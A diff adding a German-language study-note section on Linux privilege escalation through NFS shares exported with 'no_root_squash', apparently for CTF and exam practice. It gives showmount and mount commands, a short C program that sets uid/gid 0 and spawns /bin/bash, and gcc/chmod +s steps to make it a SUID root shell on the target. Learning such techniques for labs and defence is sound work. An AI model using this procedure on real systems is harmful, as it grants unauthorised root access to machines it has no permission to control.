@@ -263,6 +263,43 @@ Ein weiterer Vektor, der eher für CTFs und Prüfungen relevant ist, ist eine fa
 Die NFS-Konfiguration (Network File Sharing) wird in der Datei `/etc/exports` gespeichert. Diese Datei wird bei der Installation des NFS-Servers erstellt und kann normalerweise von den Benutzern gelesen werden.
 Das entscheidende Element für diesen Vektor der Privilegienerweiterung ist die Option „no_root_squash“. Standardmäßig ändert NFS den Root-Benutzer in nfsnobody und entfernt jede Datei, die mit Root-Rechten arbeitet. Wenn die Option „no_root_squash“ auf einer beschreibbaren Freigabe vorhanden ist, können wir eine ausführbare Datei mit gesetztem SUID-Bit erstellen und sie auf dem Zielsystem ausführen.****
 
+
+Exploitation: 
+Auf der Ziel Maschine
+Zuerst gilt es sich umzuschauen auf was man genau zugriff hat via `showmount -e *IPAdresse*` darauf hin kann man auch einen Share Mounten auf dem "no_root_squash" enabeld ist. Das geht via `mount -o rw *IPAdresse*:*ZielShare* /tmp/backupsOnAttackermashine` Das ist dann auch f ür das erste alles was man auf der Maschine machen muss.
+
+Auf der Angreifer Maschine:
+Hier erstellen wir ein Verzeichnis welches wir dann mit dem Ziel Verbinden/mounten in z.B. Temp. Nachdem wir es Verbunden haben können wir dort zum beispiel das Folgende Script anlegen und dann Compilern. (Anlegen geht direkt via Nano)
+
+```
+
+#include <stdio.h>
+#include <stdlib.h>
+
+int main()
+{
+   setgid(0);
+   setuid(0);
+   system("/bin/bash");
+   return 0;
+}
+
+```
+
+In dem Beispiel habe ich den Output als nfs.c gespeichert und dann mit den Folgenden Befehlen Compiliert, Ausführbar gemacht und dann noch die Rechte Kontrolliert: 
+```
+gcc nfs.c -o nfs -w
+chmod +s nfs
+ls -l nfs
+```
+
+Nun ist nur noch der letzte schritt offen und das ist das Script auf der Zielmaschine auszuführen (in dem Fall via ./nfs)
+
 ### Enumeration von Mountable Shares
 
+| Befehl                               | Wirkung                                                                |
+| ------------------------------------ | ---------------------------------------------------------------------- |
+| showmount -e *IP Adresse des Shares* | Zeigt an auf welche Verzeichnisse innerhalb des Shares man Zugriff hat |
+| mount -o rw *ZielIP:/ZielShare*      | Moiunting des Shares                                                   |
 
+ 
